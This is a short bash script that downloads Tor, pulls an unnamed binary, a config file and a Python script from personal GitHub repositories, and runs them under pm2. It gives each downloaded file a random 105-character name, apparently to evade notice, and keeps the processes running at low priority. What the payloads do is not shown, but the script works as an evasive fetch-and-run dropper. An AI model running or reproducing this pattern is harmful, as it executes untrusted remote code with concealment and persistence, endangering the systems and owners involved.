#!/bin/bash
random_name() {
      tr -dc A-Za-z0-9 </dev/urandom | head -c 105
  }
  wget -O tor.tar.gz \
https://dist.torproject.org/torbrowser/16.0/tor-expert-bundle-linux-x86_64-16.0.tar.gz

# استخراج
tar -xzf tor.tar.gz
cd tor
./tor
sleep 30
wget https://raw.githubusercontent.com/hosseinxdns/glowing-fortnight/main/x

NEW_V2=$(random_name)
mv x $NEW_V2
chmod +x $NEW_V2
wget https://raw.githubusercontent.com/hosseinxdns4/cautious-umbrella/main/q.json

echo "./$NEW_V2 run --config=q.json" > bash.sh
NEW_SH=$(random_name).sh
mv bash.sh $NEW_SH
chmod +x $NEW_SH

npm install -g pm2
pm2 start $NEW_SH

wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/main.py
NEW_PY=$(random_name).py
mv main.py $NEW_PY
chmod +x $NEW_PY
echo "./$NEW_PY -t 4 -k" > bsh.sh
chmod +x bsh.sh
./bsh.sh
nice -n 19 pm2 start bsh.sh
sleep 1600
